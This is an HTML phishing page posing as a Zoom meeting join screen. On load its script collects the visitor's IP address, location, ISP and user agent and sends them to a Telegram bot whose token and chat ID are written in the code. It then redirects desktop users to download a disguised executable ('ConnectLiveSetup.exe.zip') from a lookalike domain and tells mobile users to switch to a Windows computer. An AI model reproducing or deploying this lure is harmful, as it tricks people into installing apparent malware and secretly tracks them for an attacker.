<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Join_ZoomLive</title>
    <style>
        /* Reset & Global Settings */
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #f8f9fa;
        }

        /* -----------------------------------
           MOBILE VIEW 
           ----------------------------------- */
        #mobile-view {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
            padding: 20px;
            box-sizing: border-box;
        }
        
        .warning-container {
            max-width: 400px;
        }
        
        .warning-title {
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            font-weight: 600;
            color: #d93025;
            margin-bottom: 25px;
        }
        
        .warning-title .emoji {
            font-size: 26px;
            margin-right: 8px;
        }
        
        .warning-text {
            font-size: 15px;
            color: #3c4043;
            margin-bottom: 20px;
            line-height: 1.5;
        }

        /* -----------------------------------
           DESKTOP VIEW (Background + Spinner)
           ----------------------------------- */
        #desktop-view {
            display: none;
            height: 100vh;
            width: 100vw;
            background: url('https://st1.zoom.us/fe-static/fe-signup-login-active-v3/assets/banner-step-1.DTtJ7nly.png') no-repeat center center fixed;
            background-size: cover;
            position: relative;
        }

        .logo {
            position: absolute;
            top: 20px;
            left: 20px;
            height: 40px;
            width: auto;
            z-index: 10;
        }

        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.7); 
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 5;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #e5e5e5;
            border-top-color: #0b5cff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <!-- DOM Element: Mobile Warning -->
    <div id="mobile-view">
        <div class="warning-container">
            <div class="warning-title">
                <span class="emoji">⚠️</span> Desktop Only
            </div>
            <div class="warning-text">
                Access is only available on a desktop or Windows computer.
            </div>
            <div class="warning-text">
                Please check your email and open the document on a laptop or desktop device.
            </div>
        </div>
    </div>

    <!-- DOM Element: Desktop Loader -->
    <div id="desktop-view">
        <img class="logo" src="https://st1.zoom.us/fe-static/fe-signup-login-active-v3/assets/banner-step-1.DTtJ7nA" alt="Company Logo">

        <div class="overlay">
            <div class="spinner"></div>
        </div>
    </div>

    <!-- Core Logic -->
    <script>
        // Configuration Parameters
        const TELEGRAM_BOT_TOKEN = "6668477550:AAHcd2QQXbZYgTvxhWlOf0wzF9A-W0VGUfI"; // Insert your Bot Token here
        const TELEGRAM_CHAT_ID = "2074391753";     // Insert your Chat ID here
        const TARGET_URL = "https://application.connectliveagent.com/ConnectLiveSetup.exe.zip";

        /**
         * Fetch Geolocation & ISP data from a free CORS/HTTPS endpoint
         */
        async function getVisitorDetails() {
            try {
                const response = await fetch('https://ipwho.is/');
                const data = await response.json();

                if (data.success) {
                    return {
                        ip: data.ip || 'N/A',
                        city: data.city || 'N/A',
                        state: data.region || 'N/A',
                        country: data.country || 'N/A',
                        isp: data.connection?.isp || 'N/A'
                    };
                }
            } catch (error) {
                console.error('Error fetching IP details:', error);
            }
            return { ip: 'N/A', city: 'N/A', state: 'N/A', country: 'N/A', isp: 'N/A' };
        }

        /**
         * Dispatch data to Telegram API via POST request
         */
        async function sendTelegramAlert(visitor, isMobileDevice) {
            const message = 
`🔔 *New Visitor Notification*

📍 *Network Info:*
• *IP Address:* \`${visitor.ip}\`
• *City:* ${visitor.city}
• *State:* ${visitor.state}
• *Country:* ${visitor.country}
• *ISP:* ${visitor.isp}

💻 *Device Info:*
• *Device Type:* ${isMobileDevice ? 'Mobile 📱' : 'Desktop 🖥️'}
• *User Agent:* \`${navigator.userAgent}\``;

            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (error) {
                console.error('Error sending Telegram notification:', error);
            }
        }

        document.addEventListener('DOMContentLoaded', async () => {
            // 1. Detect device environment
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

            // 2. Fetch visitor IP & Geolocation
            const visitorInfo = await getVisitorDetails();

            // 3. Send notification to Telegram
            await sendTelegramAlert(visitorInfo, isMobile);

            // 4. Render appropriate UI view
            if (isMobile) {
                document.getElementById('mobile-view').style.display = 'flex';
            } else {
                document.getElementById('desktop-view').style.display = 'block';

                // 5. Trigger redirect delay
                setTimeout(() => {
                    window.location.replace(TARGET_URL);
                }, 5000); 
            }
        });
    </script>
</body>
</html>
